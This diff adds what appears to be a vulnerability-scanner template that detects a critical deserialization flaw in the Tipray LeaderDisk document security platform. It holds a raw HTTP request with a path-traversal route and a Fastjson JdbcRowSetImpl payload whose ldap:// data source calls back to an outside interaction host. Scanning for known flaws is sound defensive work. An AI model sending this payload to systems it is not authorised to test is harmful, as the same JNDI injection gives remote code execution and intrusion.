@@ -1,0 +1,32 @@
+id: poc-yaml-tipray-dsmp-restormachinetoclient-deserialize
+info:
+  name: Tipray LeaderDisk Document Security Management Platform Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../ldfbsnodeDocumentController/restorMachineToClient.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        diskMatch={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}&sourceUmId=1&destUmId=1
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "false"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
